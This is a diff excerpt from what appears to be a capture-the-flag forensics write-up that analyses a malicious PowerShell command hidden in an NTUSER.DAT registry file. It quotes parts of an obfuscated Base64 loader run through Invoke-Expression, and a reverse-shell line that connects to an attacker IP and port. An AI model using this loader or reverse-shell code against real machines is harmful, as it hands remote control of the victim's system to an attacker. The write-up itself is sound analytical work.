@@ -31,7 +31,7 @@ So download the zip file and you get the NTUSER.DAT file. Do a little research a
 + ___FOREAcH-object{ neW-obJEct io.streAMrEadeR( $_,[sysTem.TExt.EnCoDING]::asCIi )}).reaDToEnD()__: Reads the decoded PowerShell script into a string.
 + __|inVOKe-exprEsSIon__: Executes it with Invoke-Expression, likely running malware.
 
-So our attention is the Base64 string so I use Powershell script to decode it and write the result to __output.txt__ (__decode.ps1__). Unsurprisingly, it is a __reverse shell__ script that print out the flag, read the script and you will get the flag!!
+So our attention is the Base64 string so I use Powershell to decode it and write the result to __output.txt__ (__decode.txt__). Unsurprisingly, it is a __reverse shell__ script that print out the flag, read the script and you will get the flag!!
 
 P/S: Analyze the reverse shell:
 + __$client = New-Object System.Net.Sockets.TCPClient("192.168.253.27",4953);__: Creates a TCP connection to 192.168.253.27:4953. Attacker machine!!
